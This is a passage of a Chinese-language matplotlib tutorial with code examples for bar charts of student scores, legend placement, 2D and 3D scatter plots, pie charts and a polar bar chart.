number">67</span><span class="token punctuation">]</span>bar_width <span class="token operator">=</span> <span class="token number">0.3</span>str1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">"数学"</span><span class="token punctuation">,</span><span class="token string">"英语"</span><span class="token punctuation">,</span><span class="token string">"语文"</span><span class="token punctuation">,</span><span class="token string">"计算机"</span><span class="token punctuation">,</span><span class="token string">"体育"</span><span class="token punctuation">)</span><span class="token comment"># 绘图</span>plt<span class="token punctuation">.</span>bar<span class="token punctuation">(</span>x<span class="token punctuation">,</span> height<span class="token operator">=</span>y1<span class="token punctuation">,</span> width<span class="token operator">=</span>bar_width<span class="token punctuation">,</span> label<span class="token operator">=</span><span class="token string">"王晨"</span><span class="token punctuation">,</span> tick_label<span class="token operator">=</span>str1<span class="token punctuation">,</span>color<span class="token operator">=</span><span class="token string">'b'</span><span class="token punctuation">)</span><span class="token comment">#tick_label下标的标签，label直接是标签</span>plt<span class="token punctuation">.</span>bar<span class="token punctuation">(</span>x<span class="token operator">+</span>bar_width<span class="token punctuation">,</span> height<span class="token operator">=</span>y2<span class="token punctuation">,</span> width<span class="token operator">=</span>bar_width<span class="token punctuation">,</span> label<span class="token operator">=</span><span class="token string">"刘星"</span><span class="token punctuation">,</span>color<span class="token operator">=</span><span class="token string">'r'</span><span class="token punctuation">,</span>align<span class="token operator">=</span><span class="token string">"center"</span><span class="token punctuation">)</span><span class="token comment">#添加图例</span>plt<span class="token punctuation">.</span>legend<span class="token punctuation">(</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="./python%E7%BB%98%E5%9B%BE%E5%8F%8A%E5%8F%AF%E8%A7%86%E5%8C%96%E5%A4%87%E8%AF%BE/Figure_16.png" alt=""></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt<span class="token comment"># 显示汉字设置</span>plt<span class="token punctuation">.</span>rcParams<span class="token punctuation">[</span><span class="token string">'font.sans-serif'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'SimHei'</span><span class="token punctuation">]</span>plt<span class="token punctuation">.</span>rcParams<span class="token punctuation">[</span><span class="token string">'axes.unicode_minus'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">False</span><span class="token comment"># 定义函数来显示柱状上的数值</span><span class="token keyword">def</span> <span class="token function">autolabel</span><span class="token punctuation">(</span>rects<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> rect <span class="token keyword">in</span> rects<span class="token punctuation">:</span>        height <span class="token operator">=</span> rect<span class="token punctuation">.</span>get_height<span class="token punctuation">(</span><span class="token punctuation">)</span>        plt<span class="token punctuation">.</span>text<span class="token punctuation">(</span>rect<span class="token punctuation">.</span>get_x<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> rect<span class="token punctuation">.</span>get_width<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">.</span> <span class="token operator">-</span> <span class="token number">0.2</span><span class="token punctuation">,</span> <span class="token number">1.03</span> <span class="token operator">*</span> height<span class="token punctuation">,</span> <span class="token string">'%s'</span> <span class="token operator">%</span> <span class="token builtin">float</span><span class="token punctuation">(</span>height<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    l1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">68</span><span class="token punctuation">,</span> <span class="token number">96</span><span class="token punctuation">,</span> <span class="token number">85</span><span class="token punctuation">,</span> <span class="token number">86</span><span class="token punctuation">,</span> <span class="token number">76</span><span class="token punctuation">,</span> <span class="token number">87</span><span class="token punctuation">,</span> <span class="token number">95</span><span class="token punctuation">]</span>    l2 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">85</span><span class="token punctuation">,</span> <span class="token number">68</span><span class="token punctuation">,</span> <span class="token number">79</span><span class="token punctuation">,</span> <span class="token number">89</span><span class="token punctuation">,</span> <span class="token number">94</span><span class="token punctuation">,</span> <span class="token number">82</span><span class="token punctuation">,</span> <span class="token number">90</span><span class="token punctuation">]</span>    name <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'赵临'</span><span class="token punctuation">,</span> <span class="token string">'呼俞'</span><span class="token punctuation">,</span> <span class="token string">'侯亚'</span><span class="token punctuation">,</span> <span class="token string">'翟蓉'</span><span class="token punctuation">,</span> <span class="token string">'张婷'</span><span class="token punctuation">,</span> <span class="token string">'赵九'</span><span class="token punctuation">,</span> <span class="token string">'赵泽'</span><span class="token punctuation">]</span>    total_width<span class="token punctuation">,</span> n <span class="token operator">=</span> <span class="token number">0.8</span><span class="token punctuation">,</span> <span class="token number">2</span>    width <span class="token operator">=</span> total_width <span class="token operator">/</span> n    x <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">]</span>    a <span class="token operator">=</span> plt<span class="token punctuation">.</span>bar<span class="token punctuation">(</span>x<span class="token punctuation">,</span> l1<span class="token punctuation">,</span> width<span class="token operator">=</span>width<span class="token punctuation">,</span> label<span class="token operator">=</span><span class="token string">'大学IT'</span><span class="token punctuation">,</span> fc<span class="token operator">=</span><span class="token string">'b'</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        x<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> x<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> width    b <span class="token operator">=</span> plt<span class="token punctuation">.</span>bar<span class="token punctuation">(</span>x<span class="token punctuation">,</span> l2<span class="token punctuation">,</span> width<span class="token operator">=</span>width<span class="token punctuation">,</span> label<span class="token operator">=</span><span class="token string">'图像处理'</span><span class="token punctuation">,</span> tick_label<span class="token operator">=</span>name<span class="token punctuation">,</span> fc<span class="token operator">=</span><span class="token string">'r'</span><span class="token punctuation">)</span>    autolabel<span class="token punctuation">(</span>a<span class="token punctuation">)</span>    autolabel<span class="token punctuation">(</span>b<span class="token punctuation">)</span>    plt<span class="token punctuation">.</span>xlabel<span class="token punctuation">(</span><span class="token string">'姓名'</span><span class="token punctuation">)</span>    plt<span class="token punctuation">.</span>ylabel<span class="token punctuation">(</span><span class="token string">'成绩'</span><span class="token punctuation">)</span>    plt<span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token string">'学生成绩'</span><span class="token punctuation">)</span>    plt<span class="token punctuation">.</span>legend<span class="token punctuation">(</span><span class="token punctuation">)</span>    plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="./python%E7%BB%98%E5%9B%BE%E5%8F%8A%E5%8F%AF%E8%A7%86%E5%8C%96%E5%A4%87%E8%AF%BE/Figure_17.png" alt=""></p><h3 id="拓展图例的位置">拓展图例的位置</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">在legend的参数中， loc参数设置图例的显示位置的： plt<span class="token punctuation">.</span>legend<span class="token punctuation">(</span><span class="token punctuation">[</span>l1<span class="token punctuation">,</span> l2<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'first'</span><span class="token punctuation">,</span> <span class="token string">'second'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> loc <span class="token operator">=</span> <span class="token string">'upper right'</span><span class="token punctuation">)</span><span class="token comment">#其中，loc表示位置的；</span><span class="token string">'best'</span>         <span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>only implemented <span class="token keyword">for</span> axes legends<span class="token punctuation">)</span><span class="token punctuation">(</span>自适应方式<span class="token punctuation">)</span><span class="token string">'upper right'</span>  <span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'upper left'</span>   <span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span><span class="token string">'lower left'</span>   <span class="token punctuation">:</span> <span class="token number">3</span><span class="token punctuation">,</span><span class="token string">'lower right'</span>  <span class="token punctuation">:</span> <span class="token number">4</span><span class="token punctuation">,</span><span class="token string">'right'</span>        <span class="token punctuation">:</span> <span class="token number">5</span><span class="token punctuation">,</span><span class="token string">'center left'</span>  <span class="token punctuation">:</span> <span class="token number">6</span><span class="token punctuation">,</span><span class="token string">'center right'</span> <span class="token punctuation">:</span> <span class="token number">7</span><span class="token punctuation">,</span><span class="token string">'lower center'</span> <span class="token punctuation">:</span> <span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'upper center'</span> <span class="token punctuation">:</span> <span class="token number">9</span><span class="token punctuation">,</span><span class="token string">'center'</span>       <span class="token punctuation">:</span> <span class="token number">10</span><span class="token comment">#实际上bbox_to_anchor()函数的范围是(0,1),也就是将整张图看做1 * 1大小</span><span class="token comment">#对于两个元素的bbox_to_anchor()，也就是(x,y)，这个参数是代表了lengend_box的起点，并且是有后面的loc决定 的。</span><span class="token comment">#例如，设置(0.5,0.5), loc='center'，那么代表lengend_box的中心点（center）坐标是(0.5, 0.5)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="5-5-散点图">5.5 散点图</h2><p>在实际数据分析应用中，散点图是一种常用于观测数据的相关性的数据可视化方式。数据的相关性通常有正相关、负相关及不相关。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">plt<span class="token punctuation">.</span>scatter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">,</span> s<span class="token punctuation">,</span> c <span class="token punctuation">,</span>marker<span class="token punctuation">,</span> alpha<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> pltx <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">]</span>y <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">33</span><span class="token punctuation">,</span> <span class="token number">38</span><span class="token punctuation">,</span><span class="token number">55</span><span class="token punctuation">,</span><span class="token number">59</span><span class="token punctuation">,</span> <span class="token number">66</span><span class="token punctuation">,</span> <span class="token number">77</span><span class="token punctuation">]</span>plt<span class="token punctuation">.</span>scatter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">,</span>c<span class="token operator">=</span><span class="token string">'r'</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="拓展：三维散点图">拓展：三维散点图</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> numpy <span class="token keyword">as</span> np<span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt<span class="token keyword">from</span> mpl_toolkits<span class="token punctuation">.</span>mplot3d <span class="token keyword">import</span> Axes3D  <span class="token comment"># 空间三维画图</span><span class="token comment"># 数据１</span>data1 <span class="token operator">=</span> np<span class="token punctuation">.</span>arange<span class="token punctuation">(</span><span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">.</span>reshape<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>x1 <span class="token operator">=</span> data1<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span>  <span class="token comment"># [ 0  3  6  9 12 15 18 21]</span>y1 <span class="token operator">=</span> data1<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span>  <span class="token comment"># [ 1  4  7 10 13 16 19 22]</span>z1 <span class="token operator">=</span> data1<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">]</span>  <span class="token comment"># [ 2  5  8 11 14 17 20 23]</span><span class="token comment"># 数据２</span>data2 <span class="token operator">=</span> np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">23</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>x2 <span class="token operator">=</span> data2<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span>y2 <span class="token operator">=</span> data2<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span>z2 <span class="token operator">=</span> data2<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token comment"># 绘制散点图</span>fig <span class="token operator">=</span> plt<span class="token punctuation">.</span>figure<span class="token punctuation">(</span><span class="token punctuation">)</span>ax <span class="token operator">=</span> Axes3D<span class="token punctuation">(</span>fig<span class="token punctuation">)</span>ax<span class="token punctuation">.</span>scatter<span class="token punctuation">(</span>x1<span class="token punctuation">,</span> y1<span class="token punctuation">,</span> z1<span class="token punctuation">,</span> c<span class="token operator">=</span><span class="token string">'r'</span><span class="token punctuation">,</span> label<span class="token operator">=</span><span class="token string">'顺序点'</span><span class="token punctuation">)</span>ax<span class="token punctuation">.</span>scatter<span class="token punctuation">(</span>x2<span class="token punctuation">,</span> y2<span class="token punctuation">,</span> z2<span class="token punctuation">,</span> c<span class="token operator">=</span><span class="token string">'g'</span><span class="token punctuation">,</span> label<span class="token operator">=</span><span class="token string">'随机点'</span><span class="token punctuation">)</span><span class="token comment"># 绘制图例</span>ax<span class="token punctuation">.</span>legend<span class="token punctuation">(</span>loc<span class="token operator">=</span><span class="token string">'best'</span><span class="token punctuation">)</span><span class="token comment"># 添加坐标轴(顺序是Z, Y, X)</span>ax<span class="token punctuation">.</span>set_zlabel<span class="token punctuation">(</span><span class="token string">'Z'</span><span class="token punctuation">,</span> fontdict<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'size'</span><span class="token punctuation">:</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token string">'color'</span><span class="token punctuation">:</span> <span class="token string">'red'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>ax<span class="token punctuation">.</span>set_ylabel<span class="token punctuation">(</span><span class="token string">'Y'</span><span class="token punctuation">,</span> fontdict<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'size'</span><span class="token punctuation">:</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token string">'color'</span><span class="token punctuation">:</span> <span class="token string">'red'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>ax<span class="token punctuation">.</span>set_xlabel<span class="token punctuation">(</span><span class="token string">'X'</span><span class="token punctuation">,</span> fontdict<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'size'</span><span class="token punctuation">:</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token string">'color'</span><span class="token punctuation">:</span> <span class="token string">'red'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token comment"># 展示</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="./python%E7%BB%98%E5%9B%BE%E5%8F%8A%E5%8F%AF%E8%A7%86%E5%8C%96%E5%A4%87%E8%AF%BE/Figure_18.png" alt=""></p><p>拓展三维散点图，就要讲到matplotlib库里的另一个模块，mpl_toolkits.mplot3d，这个本身就来源于matplotlib不需要再行安装。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">ax<span class="token punctuation">.</span>scatter<span class="token punctuation">(</span>xs<span class="token punctuation">,</span> ys<span class="token punctuation">,</span> zs<span class="token punctuation">,</span> s<span class="token operator">=</span><span class="token number">20</span><span class="token punctuation">,</span> c<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> depthshade<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> <span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">*</span>kwargs<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>xs,ys,zs：输入数据；</li><li>s:scatter点的尺寸</li><li>c:颜色，如c = 'r’就是红色；</li><li>depthshase:透明化，True为透明，默认为True，False为不透明</li><li>*args等为扩展变量，如maker = ‘o’，则scatter结果为’o‘的形状</li></ul><p>我们可以看到同一个函数的参数列表基本一致。三维散点图与二维散点图的去别在于需要使用Axes3D对象或使用projection ='3d’关键字的任何其他轴一样创建。 创建一个新的matplotlib.figure.Figure并为其添加一个类型为Axes3D的新轴。</p><h2 id="5-6-饼图">5 . 6  饼图</h2><p>由于我在制作过程中发现图片使用过多真的太大了，所以后面的代码除了我重点想为大家拓展的，其他会直接进行演示</p><p>饼图是一种将各项数据的大小与各项数据的总和的比例显示在一张饼中的数据可视化方式。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">plt<span class="token punctuation">.</span>pie<span class="token punctuation">(</span>x<span class="token punctuation">,</span> explode<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> labels<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> colors<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> autopct<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> pctdistance<span class="token operator">=</span><span class="token number">0.6</span><span class="token punctuation">,</span> shadow<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> labeldistance<span class="token operator">=</span><span class="token number">1.1</span><span class="token punctuation">,</span> startangle<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> radius<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> counterclock<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> wedgeprops<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> textprops<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> center<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> frame<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt<span class="token comment">#添加以下两句代码，显示汉字标题</span>plt<span class="token punctuation">.</span>rcParams<span class="token punctuation">[</span><span class="token string">'font.sans-serif'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'SimHei'</span><span class="token punctuation">]</span>plt<span class="token punctuation">.</span>rcParams<span class="token punctuation">[</span><span class="token string">'axes.unicode_minus'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token boolean">False</span><span class="token comment"># 数据</span>labels <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"数学"</span><span class="token punctuation">,</span> <span class="token string">"语文"</span><span class="token punctuation">,</span> <span class="token string">"英语"</span><span class="token punctuation">,</span> <span class="token string">"物理"</span><span class="token punctuation">,</span><span class="token string">"化学"</span><span class="token punctuation">]</span>cj <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">91</span><span class="token punctuation">,</span> <span class="token number">88</span><span class="token punctuation">,</span> <span class="token number">89</span><span class="token punctuation">,</span> <span class="token number">89</span><span class="token punctuation">,</span><span class="token number">92</span><span class="token punctuation">]</span><span class="token comment"># 画图</span>plt<span class="token punctuation">.</span>pie<span class="token punctuation">(</span>x<span class="token operator">=</span>cj<span class="token punctuation">,</span> labels<span class="token operator">=</span>labels<span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt<span class="token comment">#添加以下两句代码，显示汉字标题</span>plt<span class="token punctuation">.</span>rcParams<span class="token punctuation">[</span><span class="token string">'font.sans-serif'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'SimHei'</span><span class="token punctuation">]</span>plt<span class="token punctuation">.</span>rcParams<span class="token punctuation">[</span><span class="token string">'axes.unicode_minus'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token boolean">False</span><span class="token comment"># 数据</span>labels <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"数学"</span><span class="token punctuation">,</span> <span class="token string">"语文"</span><span class="token punctuation">,</span> <span class="token string">"英语"</span><span class="token punctuation">,</span> <span class="token string">"物理"</span><span class="token punctuation">,</span><span class="token string">"化学"</span><span class="token punctuation">]</span>cj <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">91</span><span class="token punctuation">,</span> <span class="token number">88</span><span class="token punctuation">,</span> <span class="token number">89</span><span class="token punctuation">,</span> <span class="token number">89</span><span class="token punctuation">,</span><span class="token number">92</span><span class="token punctuation">]</span>tuchu<span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0.1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token comment"># 画图</span>plt<span class="token punctuation">.</span>pie<span class="token punctuation">(</span>x<span class="token operator">=</span>cj<span class="token punctuation">,</span> labels<span class="token operator">=</span>labels<span class="token punctuation">,</span>explode<span class="token operator">=</span>tuchu<span class="token punctuation">,</span> shadow<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个实例添加了两个参数，explode=tuchu, shadow=True,<code>explode=tuchu</code>控制突出显示效果，<s>其实这个突出效果是用便宜实现的，可以自己设置偏移量的多少</s>，<code>shadow=True</code>控制添加阴影效果。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt<span class="token comment">#添加以下两句代码，显示汉字标题</span>plt<span class="token punctuation">.</span>rcParams<span class="token punctuation">[</span><span class="token string">'font.sans-serif'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'SimHei'</span><span class="token punctuation">]</span>plt<span class="token punctuation">.</span>rcParams<span class="token punctuation">[</span><span class="token string">'axes.unicode_minus'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token boolean">False</span><span class="token comment"># 数据</span>labels <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"数学"</span><span class="token punctuation">,</span> <span class="token string">"语文"</span><span class="token punctuation">,</span> <span class="token string">"英语"</span><span class="token punctuation">,</span> <span class="token string">"物理"</span><span class="token punctuation">,</span><span class="token string">"化学"</span><span class="token punctuation">]</span>cj <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">91</span><span class="token punctuation">,</span> <span class="token number">88</span><span class="token punctuation">,</span> <span class="token number">89</span><span class="token punctuation">,</span> <span class="token number">89</span><span class="token punctuation">,</span><span class="token number">92</span><span class="token punctuation">]</span>tuchu <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0.1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token comment"># 画图</span>plt<span class="token punctuation">.</span>pie<span class="token punctuation">(</span>x<span class="token operator">=</span>cj<span class="token punctuation">,</span> labels<span class="token operator">=</span>labels<span class="token punctuation">,</span>explode<span class="token operator">=</span>tuchu<span class="token punctuation">,</span> shadow<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>autopct<span class="token operator">=</span><span class="token string">"%0.1f%%"</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>legend<span class="token punctuation">(</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>本实例通过autopct=&quot;%0.1f%%显示数据标签，其中%0.1f指定显示小数点后一位的浮点数，后面的两个%%用于显示一个%号，通过plt.legend()控制了显示图例。</p><h3 id="拓展：极轴饼图">拓展：极轴饼图</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> numpy <span class="token keyword">as</span> np<span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> pltnp<span class="token punctuation">.</span>random<span class="token punctuation">.</span>seed<span class="token punctuation">(</span><span class="token number">19680801</span><span class="token punctuation">)</span><span class="token comment">#生成随机数</span>N <span class="token operator">=</span> <span class="token number">10</span><span class="token comment">#显示几个圆圈</span>theta <span class="token operator">=</span> np<span class="token punctuation">.</span>linspace<span class="token punctuation">(</span><span class="token number">0.0</span><span class="token punctuation">,</span> <span class="token number">2</span> <span class="token operator">*</span> np<span class="token punctuation">.</span>pi<span class="token punctuation">,</span> N<span class="token punctuation">,</span> endpoint<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>radii <span class="token operator">=</span> <span class="token number">10</span> <span class="token operator">*</span> np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>rand<span class="token punctuation">(</span>N<span class="token punctuation">)</span><span class="token comment">#</span>width <span class="token operator">=</span> np<span class="token punctuation">.</span>pi <span class="token operator">/</span> <span class="token number">4</span> <span class="token operator">*</span> np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>rand<span class="token punctuation">(</span>N<span class="token punctuation">)</span><span class="token comment">#</span><span class="token comment">#在添加projection='polar'之后解释器会自动绘制出一张即坐标图</span>ax <span class="token operator">=</span> plt<span class="token punctuation">.</span>subplot<span class="token punctuation">(</span><span class="token number">111</span><span class="token punctuation">,</span> projection<span class="token operator">=</span>‘polar’<span class="token punctuation">)</span><span class="token comment">#bars = ax.bar(theta, radii, width=width, bottom=0.0)</span><span class="token comment">#前三个参数分别对应left,height,width,left表示从哪开始，表示开始 位置，</span><span class="token comment">#height表示从中心点向边缘绘制的长度</span>bars <span class="token operator">=</span> ax<span class="token punctuation">.</span>bar<span class="token punctuation">(</span>theta<span class="token punctuation">,</span> radii<span class="token punctuation">,</span> width<span class="token operator">=</span>width<span class="token punctuation">,</span> bottom<span class="token operator">=</span><span class="token number">0.0</span><span class="token punctuation">)</span><span class="token comment">#left表示从哪开始，</span><span class="token comment">#radii表示从中心点向边缘绘制的长度（半径）</span><span class="token comment">#width表示末端的弧长</span><span class="token comment">#bottom意思是底部</span><span class="token comment">#自定义颜色和不透明度，下面代码是在极坐标系中画出扇形图的</span><span class="token keyword">for</span> r<span class="token punctuation">,</span> bar <span class="token keyword">in</span> <span class="token builtin">zip</span><span class="token punctuation">(</span>radii<span class="token punctuation">,</span> bars<span class="token punctuation">)</span><span class="token punctuation">:</span>bar<span class="token punctuation">.</span>set_facecolor<span class="token punctuation">(</span>plt<span class="token punctuation">.</span>cm<span class="token punctuation">.</span>viridis<span class="token punctuation">(</span>r<span class="token operator">/</span><span class="token number">11</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span 